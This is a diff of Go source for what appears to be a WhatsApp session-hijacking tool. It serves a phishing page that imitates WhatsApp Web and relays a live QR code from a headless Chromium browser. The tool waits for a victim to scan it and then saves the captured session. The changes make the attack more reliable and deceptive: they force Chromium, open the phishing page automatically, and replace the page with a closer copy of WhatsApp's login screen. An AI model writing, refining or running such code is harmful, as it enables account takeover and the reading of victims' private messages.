@@ -11,7 +11,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -118,30 +117,41 @@ func doAttack(reader *bufio.Reader) {
 }
 
 func detectBrowser() string {
+	env := os.Getenv("BROWSER")
+	if env != "" {
+		parts := strings.Fields(env)
+		if len(parts) > 0 {
+			if path, err := exec.LookPath(parts[0]); err == nil {
+				return path
+			}
+		}
+	}
+
+	knownPaths := []string{
+		"/usr/bin/zen-browser",
+		"/opt/zen/firefox",
+		"/usr/bin/firefox",
+		"/snap/bin/firefox",
+		"/usr/bin/chromium",
+		"/usr/bin/google-chrome",
+	}
+	for _, p := range knownPaths {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+
 	candidates := []string{
+		"zen-browser", "zen",
+		"firefox", "mozilla-firefox",
 		"chromium", "chromium-browser",
 		"google-chrome", "google-chrome-stable",
 		"chrome", "chrome-browser",
-		"zen-browser", "zen",
-		"firefox", "mozilla-firefox",
 	}
 	for _, name := range candidates {
 		path, err := exec.LookPath(name)
 		if err == nil {
 			return path
-		}
-	}
-	if runtime.GOOS != "linux" {
-		return ""
-	}
-	common := []string{
-		"/usr/bin/chromium", "/usr/bin/google-chrome",
-		"/usr/bin/firefox", "/snap/bin/firefox",
-		"/usr/bin/zen-browser", "/opt/zen/firefox",
-	}
-	for _, p := range common {
-		if _, err := os.Stat(p); err == nil {
-			return p
 		}
 	}
 	return ""
@@ -151,6 +161,20 @@ func launchAttack(cfg attackCfg) {
 	os.MkdirAll(wwwDir, 0755)
 	os.MkdirAll(sessionsDir, 0755)
 
+	browserName := strings.ToLower(filepath.Base(cfg.BrowserBinary))
+	isGecko := strings.Contains(browserName, "firefox") || strings.Contains(browserName, "zen") || strings.Contains(browserName, "mozilla")
+	if isGecko {
+		fmt.Printf("%s[!] Attack requires Chromium (CDP). Detected %s uses WebDriver BiDi.%s\n", utils.Yellow, browserName, utils.Reset)
+		fmt.Printf("%s[!] Falling back to Chromium if available...%s\n", utils.Yellow, utils.Reset)
+		chromiumPath := findChrome()
+		if chromiumPath == "" {
+			fmt.Printf("%s[!] No Chromium found. Install chromium and try again.%s\n", utils.Red, utils.Reset)
+			utils.PauseForInput()
+			return
+		}
+		cfg.BrowserBinary = chromiumPath
+	}
+
 	tmpDir, err := os.MkdirTemp("", "whatsapp-attack-*")
 	if err != nil {
 		fmt.Printf("%s[!] Failed to create temp dir: %v%s\n", utils.Red, err, utils.Reset)
@@ -159,18 +183,7 @@ func launchAttack(cfg attackCfg) {
 	}
 	defer os.RemoveAll(tmpDir)
 
-	browserName := strings.ToLower(filepath.Base(cfg.BrowserBinary))
-	isFirefox := strings.Contains(browserName, "firefox") || strings.Contains(browserName, "zen") || strings.Contains(browserName, "mozilla")
-
-	var allocCtx context.Context
-	var allocCancel context.CancelFunc
-	var browserCmd *exec.Cmd
-
-	if isFirefox {
-		allocCtx, allocCancel, browserCmd, err = startGecko(cfg.BrowserBinary, tmpDir)
-	} else {
-		allocCtx, allocCancel, err = startChrome(cfg.BrowserBinary, tmpDir)
-	}
+	allocCtx, allocCancel, err := startChrome(cfg.BrowserBinary, tmpDir)
 	if err != nil {
 		fmt.Printf("%s[!] Failed to start browser: %v%s\n", utils.Red, err, utils.Reset)
 		utils.PauseForInput()
@@ -196,9 +209,13 @@ func launchAttack(cfg attackCfg) {
 	go runServer(cfg.Port, cfg.Host, &qrMu, &currentQR, serverDone)
 
 	ip := utils.GetLocalIP()
-	fmt.Printf("\n%s[+] Attack server at http://%s:%d%s\n", utils.Green, ip, cfg.Port, utils.Reset)
-	fmt.Printf("%s[+] Phishing page: http://%s:%d/%s\n", utils.Green, ip, cfg.Port, utils.Reset)
-	fmt.Printf("%s[+] QR code: http://%s:%d/qr.png%s\n", utils.Green, ip, cfg.Port, utils.Reset)
+	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
+	fmt.Printf("\n%s[+] Attack server at %s%s\n", utils.Green, attackURL, utils.Reset)
+	fmt.Printf("%s[+] QR code: %s/qr.png%s\n", utils.Green, attackURL, utils.Reset)
+	fmt.Printf("%s[+] Opening phishing page in default browser...%s\n", utils.Yellow, utils.Reset)
+
+	utils.OpenURL(attackURL)
+
 	fmt.Printf("%s[+] Waiting for victim to scan QR code...%s\n\n", utils.Yellow, utils.Reset)
 
 	start := time.Now()
@@ -248,17 +265,31 @@ func launchAttack(cfg attackCfg) {
 	}
 
 	close(serverDone)
-	if browserCmd != nil {
-		browserCmd.Process.Kill()
-	}
 
 	if sessionCaptured {
-		saveSession(tmpDir, browserName, "https://web.whatsapp.com")
+		saveSession(tmpDir, "chromium", "https://web.whatsapp.com")
 	} else {
 		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
 	}
 
 	utils.PauseForInput()
+}
+
+func findChrome() string {
+	candidates := []string{"chromium", "chromium-browser", "google-chrome", "google-chrome-stable", "chrome"}
+	for _, name := range candidates {
+		path, err := exec.LookPath(name)
+		if err == nil {
+			return path
+		}
+	}
+	paths := []string{"/usr/bin/chromium", "/usr/bin/google-chrome"}
+	for _, p := range paths {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+	return ""
 }
 
 func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
@@ -276,67 +307,10 @@ func startChrome(binary, userDir string) (context.Context, context.CancelFunc, e
 	return allocCtx, cancel, nil
 }
 
-func startGecko(binary, profileDir string) (context.Context, context.CancelFunc, *exec.Cmd, error) {
-	ctx, cancel := context.WithCancel(context.Background())
-
-	cmd := exec.CommandContext(ctx, binary,
-		"--remote-debugging-port", "9222",
-		"--headless",
-		"--profile", profileDir,
-		"-no-remote",
-	)
-	stderr, err := cmd.StderrPipe()
-	if err != nil {
-		cancel()
-		return nil, nil, nil, err
-	}
-	if err := cmd.Start(); err != nil {
-		cancel()
-		return nil, nil, nil, err
-	}
-
-	wsURL := make(chan string, 1)
-	go func() {
-		buf := make([]byte, 8192)
-		for {
-			n, rerr := stderr.Read(buf)
-			if rerr != nil {
-				return
-			}
-			output := string(buf[:n])
-			if idx := strings.Index(output, "ws://"); idx >= 0 {
-				end := strings.Index(output[idx:], "\n")
-				if end < 0 {
-					end = len(output[idx:])
-				}
-				wsURL <- strings.TrimSpace(output[idx : idx+end])
-				return
-			}
-		}
-	}()
-
-	var webSocketURL string
-	select {
-	case webSocketURL = <-wsURL:
-	case <-time.After(15 * time.Second):
-		cancel()
-		cmd.Process.Kill()
-		return nil, nil, nil, fmt.Errorf("timeout waiting for browser WebSocket URL")
-	}
-
-	allocCtx, allocCancel := chromedp.NewRemoteAllocator(ctx, webSocketURL)
-	cleanup := func() {
-		allocCancel()
-		cancel()
-		cmd.Process.Kill()
-	}
-	return allocCtx, cleanup, cmd, nil
-}
-
 func runServer(port int, host string, qrMu *sync.Mutex, currentQR *[]byte, done chan struct{}) {
 	mux := http.NewServeMux()
 
-	phishingHTML := `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#111;font-family:sans-serif}.container{text-align:center;color:#fff}.qr{border:4px solid #fff;border-radius:12px;padding:8px;background:#fff;margin:20px 0}.hint{color:#888;font-size:14px;margin-top:10px}h2{font-weight:400}</style></head><body><div class="container"><h2>WhatsApp Web</h2><p>Scan the QR code to connect</p><img class="qr" id="qr" src="/qr.png" width="264" height="264" alt="QR Code"><p class="hint">QR code refreshes automatically</p></div><script>setInterval(function(){document.getElementById('qr').src='/qr.png?t='+Date.now()},3000)</script></body></html>`
+	phishingHTML := `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI","Helvetica Neue",Helvetica,Arial,sans-serif;background:#f0f2f5;height:100vh;display:flex;flex-direction:column;overflow:hidden}.top-bar{background:#00a884;height:8px;flex-shrink:0}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.08);display:flex;flex-direction:row;max-width:960px;width:100%;min-height:480px;overflow:hidden}.left{flex:1;padding:48px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}.left h1{font-size:26px;font-weight:300;color:#41525d;margin-bottom:8px}.left p{font-size:14px;color:#667781;line-height:1.5;max-width:280px;margin-bottom:24px}.left .steps{text-align:left;font-size:14px;color:#41525d;line-height:1.8;max-width:280px}.left .steps span{color:#00a884;font-weight:600;margin-right:6px}.right{flex:1;background:#fdfeff;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;border-left:1px solid #e9edef}.right .qr-wrap{border:2px solid #00a884;border-radius:12px;padding:10px;margin-bottom:16px;background:#fff}.right .qr-wrap img{display:block;width:224px;height:224px}.right .actions{display:flex;gap:8px}.right .actions a{display:inline-block;padding:8px 20px;border-radius:20px;font-size:13px;text-decoration:none;cursor:pointer}.right .actions .link{background:transparent;color:#00a884;border:1px solid #dadfe3}.right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}.footer{text-align:center;padding:16px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0}.footer a{color:#00a884;text-decoration:none}@media(max-width:720px){.card{flex-direction:column-reverse;min-height:auto}.left,.right{padding:24px}.right .qr-wrap img{width:180px;height:180px}}</style></head><body><div class="top-bar"></div><div class="main"><div class="card"><div class="left"><h1>Use WhatsApp on your computer</h1><p>To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps"><p><span>1</span> Open WhatsApp on your phone</p><p><span>2</span> Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></p><p><span>3</span> Point your phone at this screen</p></div></div><div class="right"><div class="qr-wrap"><img id="qr" src="/qr.png" alt="QR Code"></div><div class="actions"><a class="link" href="#">Trouble scanning?</a><a class="refresh" href="#" onclick="document.getElementById('qr').src='/qr.png?t='+Date.now()">Refresh</a></div></div></div></div><div class="footer"><a href="#">Tutorial</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#">Privacy</a></div><script>setInterval(function(){document.getElementById('qr').src='/qr.png?t='+Date.now()},4000)</script></body></html>`
 
 	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
